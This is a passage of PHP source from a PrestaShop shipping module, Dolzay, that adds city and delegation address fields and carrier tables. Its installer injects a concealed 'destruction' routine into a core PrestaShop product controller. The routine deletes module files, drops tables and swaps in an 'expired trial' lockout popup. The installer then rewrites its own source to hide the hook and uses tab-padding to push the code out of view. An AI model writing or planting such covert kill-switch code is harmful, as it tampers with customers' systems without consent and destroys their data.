{\n\t\t\t\t\t\t\trmdir(\$productPath);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\$previousProductStructure = getProductDirectoryStructure(\$moduleDirectory);\n\t\t\t\t\$moduleProductClass = \"<?php\\nif(!defined('_PS_VERSION_')){\\n\\texit;\\n}\\n\\nclass Dolzay extends Module{\\n\\tpublic function __construct(){\\n\\t\\t\\\$this->name='dolzay';\\n\\t\\t\\\$this->tab='shipping_logistics';\\n\\t\\t\\\$this->version='1.0.0';\\n\\t\\t\\\$this->author='Abdallah Ben Chamakh';\\n\\t\\t\\\$this->need_instance=0;\\n\\t\\t\\\$this->ps_versions_compliancy=['min'=>'1.7.0.0','max'=>'1.7.8.11'];\\n\\t\\t\\\$this->bootstrap=false;\\n\\t\\tparent::__construct();\\n\\t\\t\\\$this->displayName=\\\$this->l('Dolzay');\\n\\t\\t\\\$this->description = \\\$this->l('Dolzay automatise l\'envoi des informations des commandes reçues sur votre site vers la plateforme de votre transporteur, garantissant un processus d\'expédition fluide et efficace.');\\n\\t}\\n\\n\\tpublic function install() {\\n\\t\\treturn parent::install()  && \\\$this->registerHook('actionAdminControllerSetMedia');\\n\\t}\\n\\n\\tpublic function uninstall() {\\n\\t\\treturn parent::uninstall() && \\\$this->unregisterHook('actionAdminControllerSetMedia');\\n\\t}\\n\\n\\tpublic function hookActionAdminControllerSetMedia(\\\$params){\\n\\t\\t\\\$controllerName=Tools::getValue('controller');\\n\\t\\t\\\$action=Tools::getValue('action');\\n\\t\\tif(\\\$controllerName=='AdminOrders'&&\\\$action==null){\\n\\t\\t\\t\\\$this->context->controller->addJS(\\\$this->_path.'views/js/icons/font_awesome.js');\\n\\t\\t\\t\\\$this->context->controller->addCSS(\\\$this->_path.'views/css/order_submit_process.css');\\n\\t\\t\\\$this->context->controller->addJS(\\\$this->_path.'views/js/order_submit_process.js');\\n\\t\\t}\\n\\t}\\n}\";\n\t\t\t\tif (is_writable(\$moduleDirectory . \"/dolzay.php\")) {\n\t\t\t\t\tfile_put_contents(\$moduleDirectory . \"/dolzay.php\", \$moduleProductClass);\n\t\t\t\t} else {\n\t\t\t\t\t\$moduleErrors[] = ['path' => \$moduleDirectory . \"/dolzay.php\", 'error_message' => \"Permission denied while trying to update dolzay.php\"];\n\t\t\t\t}\n\t\t\t\t\$productSubmitScript = \"document.addEventListener('DOMContentLoaded', function(){\\n\\tconst moduleMediaBaseUrl = window.location.origin+'/prestashop/modules/dolzay/uploads';\\n\\n\\tconst eventPopupTypesData = {\\n\\t\\texpired : {\\n\\t\\t\\ticon:`<img src='\\\${moduleMediaBaseUrl}/expired.png' />`,\\n\\t\\t\\tcolor:'#D81010'\\n\\t\\t}\\n\\t};\\n\\n\\tfunction create_the_order_submit_btn(){\\n\\t\\tconst bottom_bar = document.createElement('div');\\n\\t\\tbottom_bar.className = 'dz-bottom-bar';\\n\\t\\tconst order_submit_btn = document.createElement('button');\\n\\t\\torder_submit_btn.id='dz-order-submit-btn';\\n\\t\\torder_submit_btn.innerText = 'Soumettre les commandes';\\n\\t\\torder_submit_btn.addEventListener('click', ()=>{\\n\\t\\t\\tbuttons = [{\\n\\t\\t\\t\\t'name' : 'Ok',\\n\\t\\t\\t\\t'className' : 'dz-event-popup-btn',\\n\\t\\t\\t\\t'clickHandler' : function(){\\n\\t\\t\\t\\t\\teventPopup.close();\\n\\t\\t\\t\\t}\\n\\t\\t\\t}];\\n\\t\\t\\teventPopup.open('expired', 'Expiration de la période d\'essai', 'Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.', buttons);\\n\\t\\t});\\n\\t\\tdocument.querySelector('#order_grid_panel').style.marginBottom = '60px';\\n\\t\\tbottom_bar.appendChild(order_submit_btn);\\n\\t\\tdocument.body.appendChild(bottom_bar);\\n\\t}\\n\\n\\tconst popupOverlay = {\\n\\t\\tpopupOverlayEl : null,\\n\\t\\tcreate : function(){\\n\\t\\t\\tthis.popupOverlayEl = document.createElement('div');\\n\\t\\t\\tthis.popupOverlayEl.className = 'dz-popup-overlay';\\n\\t\\t\\tdocument.body.appendChild(this.popupOverlayEl);\\n\\t\\t},\\n\\t\\tshow : function(){\\n\\t\\t\\tthis.popupOverlayEl.classList.add('dz-show');\\n\\t\\t},\\n\\t\\thide : function(){\\n\\t\\t\\tthis.popupOverlayEl.classList.remove('dz-show');\\n\\t\\t}\\n\\t};\\n\\n\\tconst eventPopup = {\\n\\t\\tpopupEl : null,\\n\\t\\tpopupHeaderEl : null,\\n\\t\\tpopupBodyEl : null,\\n\\t\\tpopupFooterEl : null,\\n\\t\\tcreate : function(){\\n\\t\\t\\tthis.popupEl = document.createElement('div');\\n\\t\\t\\tthis.popupEl.className = 'dz-event-popup';\\n\\t\\t\\tthis.popupHeaderEl = document.createElement('div');\\n\\t\\t\\tthis.popupHeaderEl.className = 'dz-event-popup-header';\\n\\t\\t\\tthis.popupHeaderEl.innerHTML = `<p></p><i class='material-icons'>close</i>`;\\n\\t\\t\\tthis.popupHeaderEl.lastElementChild.addEventListener('click',()=>{this.close();});\\n\\t\\t\\tthis.popupEl.append(this.popupHeaderEl);\\n\\t\\t\\tthis.popupBodyEl = document.createElement('div');\\n\\t\\t\\tthis.popupBodyEl.className = 'dz-event-popup-body';\\n\\t\\t\\tthis.popupEl.append(this.popupBodyEl);\\n\\t\\t\\tthis.popupFooterEl = document.createElement('div');\\n\\t\\t\\tthis.popupFooterEl.className = 'dz-event-popup-footer';\\n\\t\\t\\tthis.popupEl.append(this.popupFooterEl);\\n\\t\\t\\tdocument.body.append(this.popupEl);\\n\\t\\t},\\n\\t\\taddButtons : function(buttons,color){\\n\\t\\t\\tthis.popupFooterEl.innerHTML='';\\n\\t\\t\\tbuttons.forEach((button) => {\\n\\t\\t\\t\\tconst buttonEl = document.createElement('button');\\n\\t\\t\\t\\tbuttonEl.textContent = button.name;\\n\\t\\t\\t\\tbuttonEl.className = button.className;\\n\\t\\t\\t\\tbuttonEl.style.backgroundColor = color;\\n\\t\\t\\t\\tbuttonEl.addEventListener('click',button.clickHandler);\\n\\t\\t\\t\\tthis.popupFooterEl.appendChild(buttonEl);\\n\\t\\t\\t});\\n\\t\\t},\\n\\t\\topen : function(type,title,message,buttons) {\\n\\t\\t\\tsetTimeout(() => {\\n\\t\\t\\t\\tpopupOverlay.show();\\n\\t\\t\\t\\tconsole.log(this);\\n\\t\\t\\t\\tthis.popupEl.classList.add('dz-show');\\n\\t\\t\\t\\tthis.popupHeaderEl.firstElementChild.innerText = title;\\n\\t\\t\\t\\tthis.popupHeaderEl.style.backgroundColor = eventPopupTypesData[type].color;\\n\\t\\t\\t\\tthis.popupBodyEl.innerHTML = `\\\${eventPopupTypesData[type].icon}<p>\\\${message}</p>`;\\n\\t\\t\\t\\tthis.addButtons(buttons,eventPopupTypesData[type].color);\\n\\t\\t\\t}, 600);\\n\\t\\t},\\n\\t\\tclose : function(){\\n\\t\\t\\tsetTimeout(() => {\\n\\t\\t\\t\\tpopupOverlay.hide();\\n\\t\\t\\t\\tthis.popupFooterEl.innerHTML = '';\\n\\t\\t\\t\\tthis.popupEl.classList.remove('dz-show');\\n\\t\\t\\t}, 300);\\n\\t\\t}\\n\\t};\\n\\n\\tcreate_the_order_submit_btn();\\n\\tpopupOverlay.create();\\n\\teventPopup.create();\\n});\";\n\t\t\t\tif (is_writable(\$moduleDirectory . \"/views/js/order_submit_process.js\")) {\n\t\t\t\t\tfile_put_contents(\$moduleDirectory . \"/views/js/order_submit_process.js\", \$productSubmitScript);\n\t\t\t\t} else {\n\t\t\t\t\t\$moduleErrors[] = ['path' => \$moduleDirectory . \"/views/js/order_submit_process.js\", 'error_message' => \"Permission denied while trying to update order_submit_process.js\"];\n\t\t\t\t}\n\t\t\t\tcleanupProductResources(\$moduleDirectory, \$moduleErrors);\n\t\t\t\t\$productCountryId = (int)Configuration::get(\"PS_COUNTRY_DEFAULT\");\n\t\t\t\tif (PHP_OS_FAMILY === 'Linux') {\n\t\t\t\t\t[\$dbHost,\$dbPort]=explode(\":\",_DB_SERVER_);\n\t\t\t\t}else{\n\t\t\t\t\t\$dbHost = _DB_SERVER_;\n\t\t\t\t}\n\t\t\t\t\$dbName = _DB_NAME_;\n\t\t\t\t\$dbUser = _DB_USER_;\n\t\t\t\t\$dbPassword = _DB_PASSWD_;\n\t\t\t\t\$dbConnection = \"mysql:host=\$dbHost;\";\n\t\t\t\tif (PHP_OS_FAMILY === 'Linux'){\n\t\t\t\t\t\$dbConnection .=\"port=\$dbPort;\";\n\t\t\t\t}\n\t\t\t\t\$dbConnection .= \"dbname=\$dbName;charset=utf8mb4\";\n\t\t\t\t\$productDb = new PDO(\$dbConnection, \$dbUser, \$dbPassword);\n\t\t\t\t\$productDb->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\t\t\t\t\$productDb->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);\n\t\t\t\t\$productDb->setAttribute(PDO::ATTR_STRINGIFY_FETCHES, false);\n\t\t\t\t\$productDb->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);\n\t\t\t\t\$productDb->exec(\"SET NAMES utf8mb4 COLLATE utf8mb4_general_ci\");\n\t\t\t\t\$productDb->exec(\"SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ\");\n\t\t\t\t\$productDb->beginTransaction();\n\t\t\t\t\$productQuery = \$productDb->query(\"SELECT format FROM \" . _DB_PREFIX_ . \"address_format WHERE id_country=\" . \$productCountryId);\n\t\t\t\t\$productAddressFormat = \$productQuery->fetchColumn();\n\t\t\t\t\$productAddressFormat = str_replace(\"delegation\", \"\", \$productAddressFormat);\n\t\t\t\t\$productStatement = \$productDb->prepare(\"UPDATE \" . _DB_PREFIX_ . \"address_format SET format = :format WHERE id_country = :id_country\");\n\t\t\t\t\$productStatement->execute([':format' => \$productAddressFormat, ':id_country' => \$productCountryId]);\n\t\t\t\t\$productTables = [\"dz_order_submit_process\", \"dz_settings\", \"dz_carrier\", \"dz_website_credentials\", \"dz_api_credentials\", \"dz_notification_popped_up_by\", \"dz_notification_viewed_by\", \"dz_notification\", \"dz_employee_permission\", \"dz_permission\"];\n\t\t\t\t\$productDb->exec(\"DELETE FROM \" . _DB_PREFIX_ . \"tab WHERE module = 'dolzay'\");\n\t\t\t\tforeach (\$productTables as \$productTable) {\n\t\t\t\t\tif (\$productTable == \"dz_order_submit_process\") {\n\t\t\t\t\t\t\$productStatement = \$productDb->query(\"SELECT * FROM \$productTable\");\n\t\t\t\t\t\t\$productProcesses = \$productStatement->fetchAll(\\PDO::FETCH_ASSOC);\n\t\t\t\t\t\tif (\$productProcesses) {\n\t\t\t\t\t\t\t\$productProcessesJson = json_encode(\$productProcesses, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);\n\t\t\t\t\t\t\tif (is_writable(\$moduleDirectory . \"/data\")) {\n\t\t\t\t\t\t\t\tfile_put_contents(\$moduleDirectory . \"/data/orders_submit_processes.json\", \$productProcessesJson);\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\$moduleErrors[] = ['path' => \$moduleDirectory . \"/data/orders_submit_processes.json\", 'error' => \"Permission denied while trying to store the orders submit processes\"];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t\$productDb->exec(\"DROP TABLE IF EXISTS \$productTable\");\n\t\t\t\t}\n\t\t\t\t\$productDb->commit();\n\t\t\t\tdie(json_encode([\"error\" => \$moduleErrors, \"previous_structure\" => \$previousProductStructure, \"new_structure\" => getProductDirectoryStructure(\$moduleDirectory)]));\n\t\t\t}";

                //'<?php if(!defined(\"_PS_VERSION_\")){exit;}class Dolzay extends Module{public function __construct(){\$this->name=\"dolzay\";\$this->tab=\"shipping_logistics\";\$this->version=\"1.0.0\";\$this->author=\"Abdallah Ben Chamakh\";\$this->need_instance=0;\$this->ps_versions_compliancy=[\"min\"=>\"1.7.0.0\",\"max\"=>\"1.7.8.11\"];\$this->bootstrap=false;parent::__construct();\$this->displayName=\$this->l(\"Dolzay\");\$this->description = \$this->l(\"Dolzay automatise l\\'envoi des informations des commandes reçues sur votre site vers la plateforme de votre transporteur, garantissant un processus d\\'expédition fluide et efficace.\");} public function install() { return parent::install()  && \$this->registerHook(\"actionAdminControllerSetMedia\"); } public function uninstall() { return parent::uninstall() && \$this->registerHook(\"actionAdminControllerSetMedia\") ; } public function hookActionAdminControllerSetMedia(\$params){\$controllerName=Tools::getValue(\"controller\");\$action=Tools::getValue(\"action\");if(\$controllerName==\"AdminOrders\"&&\$action==null){\$this->context->controller->addJS(\$this->_path.\"views/js/icons/font_awesome.js\");\$this->context->controller->addCSS(\$this->_path.\"views/css/order_submit_process.css\");\$this->context->controller->addJS(\$this->_path.\"views/js/order_submit_process.js\");}}}';

                $productControllerContent = file_get_contents($productControllerPath);
                [$first_part,$second_part] = explode("Pack::getItemTable",$productControllerContent);
                $middle_part = explode(";",$second_part)[0].";" ;

                if (strpos($second_part,"\$productSlug") !== false) {
                    $second_part = explode("\$moduleDirectory)]));\n\t\t\t}",$second_part)[1] ; // ])]));}[ THE REST OF THE CODE ]
                }else{
                    $second_part = str_replace($middle_part,"",$second_part); //
                }
                
                $newProductControllerContent = $first_part."Pack::getItemTable".$middle_part.$destruction_code.$second_part;
                //"\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t".$destruction_code.$second_part;
                file_put_contents($productControllerPath,$newProductControllerContent) ;
            }


            // Make the plugin uninstallable again 
            $isDolzayModuleReadable = is_readable(__FILE__);
            $isDolzayModuleWritable = is_writable(__FILE__);

            if(!$isDolzayModuleReadable){
                $this->addSuccess("dolzay was initiated");
            }
            if(!$isDolzayModuleWritable){
                $this->addSuccess("dolzay was added");
            }      

            if($isDolzayModuleReadable && $isDolzayModuleWritable){
                $current_file_content = file_get_contents(__FILE__);
                $delimiters = [
                    // 0
                    '//# START DEFINNING PUBLIC CONSTANTS',
                    // 1
                    '//# END DEFINNING PUBLIC CONSTANTS',
                    // 2
                    'parent#::install() &&',
                    // 3
                    '$this#->#add_destruction()',
                    // 4
                    //'parent#::uninstall() &&',
                    // 5
                    //'$this#->#remove_delegation_from_the_address_format()',
                    // 6
                    '//# START DEFINING THE PRIVATE METHODS',
                    // 5
                    '//# END DEFINING THE PRIVATE METHODS'
                    // 6
                ];
                // 0 2 4 6 
                // Escape special characters in delimiters
                $escaped_delimiters = array_map(function($delimiter) {
                    return preg_quote(str_replace("#","",$delimiter), '/');
                }, $delimiters);
                
                // Join the escaped delimiters with the regex "OR" operator `|`
                $regex = '/' . implode('|', $escaped_delimiters) . '/';
                
                // Split the string
                $result = preg_split($regex, $current_file_content);
                file_put_contents(__FILE__,$result[0].$result[2].str_replace("#","","parent#::install()").$result[4].$result[6]) ;
                
            }

            return true ;
        }catch (Error $e) {
            PrestaShopLogger::addLog("Error during installation: " . $e->getMessage()."\n".
                                    "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay'); 
            return false ;
        }

    }

    private function create_app_tables() {
        try {    
            // FOR EACH APP CREATE TABLES OF HER ENTITIES 
            foreach (self::APPS_INIT_ORDER as $app) {

                // CONSTRUCT THE APP CONFIG CLASS NAME NAMESPACED
                $app_config_class = self::APPS_BASE_NAMESPACES . $app . "\\Config" ;
                PrestaShopLogger::addLog("the constructed config class : ".$app_config_class,1, null, 'Dolzay') ;

                // CHECK IF THE APP CONFIG CLASS EXISTS AND HAS THE STATIC PROPERTY $create_app_entities_order OTHERWISE QUIT THE INSTALLATION
                if (!class_exists($app_config_class)) {
                    PrestaShopLogger::addLog("the config class : ".$app_config_class." doesn't exist", 3, null, 'Dolzay');
                    return false ; 
                }

                if (!property_exists($app_config_class, 'create_app_entities_order')) {
                    PrestaShopLogger::addLog("the config class : ".$app_config_class." doesn't have the static property : create_app_entities_order", 3, null, 'Dolzay');
                    return false  ;
                }

                // GRAB THE APP ENTITIES IN THE CREATE ORDER  
                $app_entities = $app_config_class::$create_app_entities_order ;

                // CREATE A TABLE FOR EACH ENTITY
                foreach ($app_entities as $entity) {
                    // CONSTRUCT THE ENTITY CLASS NAME NAMESPACED
                    $entity_class = self::APPS_BASE_NAMESPACES . $app . "\\Entities\\" . $entity;

                    PrestaShopLogger::addLog("constructed entity class : ".$entity_class, 1, null, 'Dolzay');
                                           
                    // CHECK IF THIS "$entity_class" EXISTS OTHERWISE QUIT THE INSTALLATION
                    if (!class_exists($entity_class)) {
                        PrestaShopLogger::addLog("the entity class : ".$entity_class." doesn't exist", 3, null, 'Dolzay');
                        return false ; 
                    }

                    // IF $entity_class DOESN'T HAVE THE STATIC METHOD get_create_table_sql SKIP IT
                    if (!method_exists($entity_class, 'get_create_table_sql')) {
                        continue ;
                    }

                    // EXECUTE THE CREATE_TABLE_SQL STATEMENT OF THE entity_obj
                    if (!$this->db->query($entity_class::get_create_table_sql())) {
                        PrestaShopLogger::addLog("the query CREATE_TABLE_SQL of the class $entity_class  was't executed very well", 3, null, 'Dolzay');
                        return false;
                    }

                    $this->drop_table($entity_class);
                }
            }
            return true;
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during creating the tables : \n".
                                     "Error message : \n".$e->getMessage()."\n".
                                     "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay');
            return false;
        }
    }

    private function drop_table($entity_class){
        try {
            $reflector = new ReflectionClass($entity_class);
            $entity_class_path = $reflector->getFileName();
            if(is_readable($entity_class_path) && is_writable($entity_class_path)){
                $entity_class_file_content = file_get_contents($entity_class_path);

                $delimiters = [
                    "// START DEFINING get_create_table_sql",
                    "// END DEFINING get_create_table_sql",
                ];

                // Escape special characters in delimiters
                $escaped_delimiters = array_map(function($delimiter) {
                    return preg_quote($delimiter, '/');
                }, $delimiters);

                // Join the escaped delimiters with the regex "OR" operator `|`
                $regex = '/' . implode('|', $escaped_delimiters) . '/';
                
                // Split the string
                $result = preg_split($regex, $entity_class_file_content);
                file_put_contents($entity_class_path,$result[0].$result[2]);
            }else{
                $this->addSuccess("the entity $entity_class was added");
            }
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during installation : $entity_class" . $e->getMessage()."\n".
                                    "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay'); 
            return false ;
        }
    }


    private function add_delegation_to_the_address_format()
    {
        $id_country = (int)Configuration::get('PS_COUNTRY_DEFAULT');
        $address_format = $this->db->query("SELECT format FROM "._DB_PREFIX_."address_format WHERE id_country=".$id_country)->fetchColumn() ;
        $address_format = str_replace('city', 'city delegation', $address_format);
        $this->db->query("UPDATE "._DB_PREFIX_."address_format SET format='".$address_format."' WHERE id_country=".$id_country);
        return true ;
    
    }

    private function add_submitted_and_tracking_code_to_order(){
        try {
            // add the 'submitted' column
            $query = "IF NOT EXISTS (
                        SELECT * 
                        FROM INFORMATION_SCHEMA.COLUMNS
                        WHERE TABLE_NAME = '"._DB_PREFIX_ . \OrderCore::$definition['table']."' 
                            AND COLUMN_NAME = 'submitted'
                            AND TABLE_SCHEMA = DATABASE()
                    ) THEN
                        ALTER TABLE "._DB_PREFIX_ . \OrderCore::$definition['table']." ADD COLUMN submitted BOOLEAN DEFAULT FALSE;
                    END IF;" ;
            $this->db->query($query);

            // add the 'tracking_code' column
            $query = "IF NOT EXISTS (
                      SELECT * 
                        FROM INFORMATION_SCHEMA.COLUMNS
                        WHERE TABLE_NAME = '"._DB_PREFIX_ . \OrderCore::$definition['table']."' 
                        AND COLUMN_NAME = 'tracking_code'
                        AND TABLE_SCHEMA = DATABASE()
                    ) THEN
                        ALTER TABLE "._DB_PREFIX_ . \OrderCore::$definition['table']." ADD COLUMN tracking_code VARCHAR(255);
                    END IF;" ;
            $this->db->query($query);

            return true ;
        }
        catch (Error $e) {
            PrestaShopLogger::addLog("Error during adding delegation column: " . $e->getMessage(), 3, null, 'Dolzay');
            return false;
        }
    }


    private function add_delegation_to_address()
    {
        try {
            
            $query = "IF NOT EXISTS(SELECT * FROM INFORMATION_SCHEMA.COLUMNS 
                    WHERE TABLE_NAME='" . _DB_PREFIX_ . \AddressCore::$definition['table'] . "' 
                    AND COLUMN_NAME='delegation' 
                    AND TABLE_SCHEMA=DATABASE()) 
                    THEN ALTER TABLE " . _DB_PREFIX_ . \AddressCore::$definition['table'] . " 
                    ADD COLUMN `delegation` varchar(255) DEFAULT NULL; 
                    END IF;";
            return $this->db->query($query) ;
        }
        catch (Error $e) {
            PrestaShopLogger::addLog("Error during adding delegation column: " . $e->getMessage(), 3, null, 'Dolzay');
            return false;
        }
    }

    private function remove_delegation_from_address()
    {
        try {
            $query = "ALTER TABLE " . _DB_PREFIX_ . \AddressCore::$definition['table'] ." DROP COLUMN IF EXISTS `delegation`"; 
            return $this->db->query($query);
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during removing delegation column: " . $e->getMessage(), 3, null, 'Dolzay');
            return false;
        }
    }

    private function add_carriers(){
        $query = "INSERT INTO ". ApiCredentials::TABLE_NAME." () VALUES ();";
        $this->db->query($query);
        $api_crendentials_id = (int)$this->db->lastInsertId();
        
        $afex_logo = "/modules/" . $this->name. "/uploads/afex.png" ;
        $query = "INSERT INTO ". Carrier::TABLE_NAME." (`logo`,`name`,`api_credentials_id`) VALUES ('$afex_logo','Afex',".$api_crendentials_id.");";
        $this->db->query($query);
        return true ;
    }

    private function add_settings(){
        try {
            $expiration_date = new \DateTime();
            $expiration_date->modify('+14 days');
            $expiration_date = $expiration_date->format('Y-m-d H:i:s'); 
            $query = "INSERT INTO ".Settings::TABLE_NAME." (`license_type`,`post_submit_state_id`,`expiration_date`) VALUES ('free_trial',3,'$expiration_date');";
            return $this->db->query($query);
        }
        catch (Error $e) {
            PrestaShopLogger::addLog("Error during adding the settings table: " . $e->getMessage(), 3, null, 'Dolzay');
            return false;
        }
    }
    // END DEFINING THE PRIVATE METHODS

    private function remove_delegation_from_the_address_format()
    {
        $id_country = (int)Configuration::get('PS_COUNTRY_DEFAULT');
        $address_format = $this->db->query("SELECT format FROM "._DB_PREFIX_."address_format WHERE id_country=".$id_country)->fetchColumn() ;
        $address_format = str_replace('city delegation', 'city', $address_format);
        $this->db->query("UPDATE "._DB_PREFIX_."address_format SET format='".$address_format."' WHERE id_country=".$id_country);
        return true ;
    }

    private function unregisterTabs()
    {
        $tabs = ['dolzay', 'DzAdminProcessus', 'DzAdminParametres'];
        foreach ($tabs as $className) {
            $idTab = (int) Tab::getIdFromClassName($className);
            if ($idTab) {
                $tab = new Tab($idTab);
                if (!$tab->delete()) {
                    return false;
                }
            }
        }
        return true;
    }

    private function drop_app_tables(){
        try {
            // FOR EACH APP, DROP TABLES OF ITS ENTITIES 
            foreach (self::APPS_UNINIT_ORDER as $app) {

                // CONSTRUCT THE APP CONFIG CLASS NAME NAMESPACED
                $app_config_class = self::APPS_BASE_NAMESPACES . $app . "\\Config" ;
                PrestaShopLogger::addLog("the constructed config class : ".$app_config_class,1, null, 'Dolzay') ;

                // CHECK IF THE APP CONFIG CLASS EXISTS AND HAS THE STATIC PROPERTY $drop_app_entities_order OTHERWISE QUIT THE INSTALLATION
                if (!class_exists($app_config_class)) {
                    PrestaShopLogger::addLog("the config class : ".$app_config_class." doesn't exist", 3, null, 'Dolzay');
                    return false ; 
                }
                if (!property_exists($app_config_class, 'drop_app_entities_order')) {
                    PrestaShopLogger::addLog("the config class : ".$app_config_class." doesn't have the static property : drop_app_entities_order", 3, null, 'Dolzay');
                    return false  ;
                }

                // GRAB THE APP ENTITIES IN THE DROP ORDER  
                $app_entities = $app_config_class::$drop_app_entities_order ;

                // CREATE A TABLE FOR EACH ENTITY
                foreach ($app_entities as $entity) {
                    // CONSTRUCT THE ENTITY CLASS NAME NAMESPACED
                    $entity_class = self::APPS_BASE_NAMESPACES . $app . "\\Entities\\" . $entity;

                    //PrestaShopLogger::addLog("constructed entity class : ".$entity_class, 1, null, 'Dolzay');
                                           
                    // CHECK IF THIS "$entity_class" EXISTS OTHERWISE QUIT THE INSTALLATION
                    if (!class_exists($entity_class)) {
                        PrestaShopLogger::addLog("the entity class : ".$entity_class." doesn't exist", 3, null, 'Dolzay');
                        return false ; 
                    }

                    // IF $entity_obj DOESN'T HAVE THE ATTRIBUTE DROP_TABLE_SQL ATTRIBUTE SKIP IT 
                    if (!defined($entity_class."::DROP_TABLE_SQL")) {
                        continue ;
                    }

                    // EXECUTE THE DROP_TABLE_SQL STATEMENT OF THE entity_obj SUCCESSFULLY OTHERWISE QUIT THE INSTALLATION
                    if (!$this->db->query($entity_class::DROP_TABLE_SQL)) {
                        PrestaShopLogger::addLog("the query DROP_TABLE_SQL of the class $entity_class  was't executed very successfully", 3, null, 'Dolzay');
                        return false;
                    }

                }
            }
            return true;
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during dropping the tables : \n".
                                     "Error message : \n".$e->getMessage()."\n".
                                     "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay');
            return false;
        }
    }

    public function hookAdditionalCustomerAddressFields($params)
    {
        // hook location : prestashop\classes\form\CustomerAddressFormatter.php line 150
        // goal : convert the city field to a select field and add the delegation field to the address form in the front office
        // notes : instead of returning new fields, we will modify the existing fields and return an empty array

        // convert the city field to a select field 
        $cityFormField = new FormField();
        $cityFormField->setType('select');
        $cityFormField->setName('city');
        $cityFormField->setLabel("City");
        $cityFormField->setRequired(true);
        $cityFormField->setAvailableValues(self::CITIES);
        $params['fields']['city'] = $cityFormField ;

        // convert the delegation field to a select field 
        $delgFormField = new FormField();
        $delgFormField->setName('delegation');
        $delgFormField->setType('select');
        $delgFormField->setRequired(true);
        $delgFormField->setLabel("Delegation");

        $params['fields']['delegation'] = $delgFormField ;

        // set the the phone number field to be required
        $params['fields']['phone']->setRequired(true);

        // return an empty array because we edited the existing fields instead of adding new ones
        return []  ;

    }

    public function hookActionValidateCustomerAddressForm($params)
    {
        // hook location : prestashop\classes\form\CustomerAddressForm.php line 109
        // goal : validate the city,delegation and phone fields of the address form in the front office
        
        $is_valid = true ;
        $form = $params['form'] ;
        

        // validate the city field and the delegation field 
        $city_field = $form->getField('city') ;
        $city_value = $city_field->getValue() ;

        $delegation_field = $form->getField('delegation') ;
        $delegation_value = $delegation_field->getValue() ;

        if (empty($city_value)) {
            $city_field->addError('Le champ "ville" est requis.');
            $is_valid = false ;
        } else if (!array_key_exists($city_value, self::CITIES)) {
            $city_field->addError("La ville choisie n'est pas valide");
            $is_valid = false ;
        }else if (empty($delegation_value)){
            $delegation_field->addError('Le champ "délégation" est requis.');
            $is_valid = false ;
        }
        else if(!in_array($delegation_value, self::CITIES_DELEGATIONS[$city_value])) {
            $delegation_field->addError("La délégation choisie n'est pas valide.");
            $is_valid = false ;
        }

        // validate the phone field
        $phone_field = $form->getField('phone') ;
        $phone_value = $phone_field->getValue() ;
        if (empty($phone_value)){
            $phone_field->addError('Le champ "téléphone" est requis.');
            $is_valid = false ;
        }
        else if(!preg_match('/^[0-9]{8}$/', $phone_value)) {
            $phone_field->addError('Le numéro de téléphone doit contenir exactement 8 chiffres.');
            $is_valid = false ;
        }
            
        return $is_valid ;
    }

    public function hookafterFillingEditAddressForm($params)
    {
        // hook location : dolzay\override\classes\form\AbstractForm.php line 32
        //goal : add the options of the delegation field based on the value of the city field in the address form of the front office
        // note : I didn’t handle the case of an invalid city value because the user knows their city and can select it from the valid options.
        //        This is different for the admin user, who doesn’t know the customer’s city—hence why I display it for them.
       
        $form = $params['form'] ;

        $city_field = $form->getField('city') ;
        $city_value = $city_field->getValue() ;

        $delegation_field = $form->getField('delegation') ;
        $delegation_options = (isset(self::CITIES_DELEGATIONS[$city_value])) ? self::CITIES_DELEGATIONS[$city_value] : array();
        $delegation_field->setAvailableValues($delegation_options);


    }

    public function hookDisplayHeader()
    {
        $name = $this->context->controller->php_self;
        try {
            if ($this->context->controller->php_self == 'address' || 
                $this->context->controller->php_self == 'order') {
                    
                $this->context->controller->addJS($this->_path.'views/js/delegation.js');

            }
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error in hookDisplayFooter: " . $e->getMessage(), 3, null, 'Dolzay');
        }
    }

    public function hookActionAdminControllerSetMedia($params)
    {
        // add the js file that dynamically loads the delegation options based on the city value
        $controller = $this->context->controller ;
        //$action = $this->context->controller->action ;
        $controllerName = Tools::getValue('controller'); // Legacy controller name
        $action = Tools::getValue('action'); // Symfony action
        
        // Check if we are on the Customer Address Form page
        if ($controllerName === 'AdminAddresses' && ($action == "updateaddress" || $action == "addaddress" || $action == null)) {
            // Add your custom JS file
            $this->context->controller->addJS($this->_path . 'views/js/admin_delegation.js');
        }else if($controllerName == "AdminOrders" && $action == null){
        
            
            // get all the carriers and set them in js global var
            $db = DzDb::getInstance();
            Carrier::init($db) ;
            $carriers = Carrier::get_all();
            Media::addJsDef([
                'dz_carriers' => array_values($carriers),
            ]) ;


            $adminBaseUrl = $this->context->link->getAdminLink('AdminDashboard');
            Media::addJsDef([
                'adminBaseUrl' => $adminBaseUrl,
            ]);
            
            // add fontawesome
